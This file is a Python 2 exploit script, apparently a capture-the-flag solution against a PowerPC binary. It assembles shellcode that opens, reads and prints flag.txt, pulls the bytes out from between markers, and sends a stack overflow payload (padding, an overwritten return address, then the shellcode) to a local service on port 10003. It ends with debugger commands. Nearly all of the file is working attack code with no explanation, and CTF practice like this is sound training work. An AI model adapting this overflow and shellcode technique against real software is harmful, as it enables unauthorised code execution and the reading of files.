asm = '''.section .text
.global _start

.ascii "%s"
_start:
  nop
  nop
  b get_addr
ret:
open:
  mflr %%r3
  xor %%r4, %%r4, %%r4
  xor %%r5, %%r5, %%r5
  li %%r0, 5
  sc
read:
  mflr %%r4
  li %%r5, 0x7f
  li %%r0, 3
  sc
write:
  li %%r3, 1
  mflr %%r4
  li %%r5, 0x7f
  li %%r0, 4
  sc
exit:
  li %%r0, 1
  sc
get_addr:
  bl ret
.ascii "%s"
'''
import os
from lib.mylib import *

ARCH = 'powerpc'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'

asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10003
s = mysock(IP, PORT)
sl(s, '\n000')
SP = 0x1af8
shellcode = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + pb(SP) + shellcode + '\n'
sl(s, shellcode)
shell(s)

'''
target sim -e linux
load bin/easy/powerpc-elf.x
r
'''
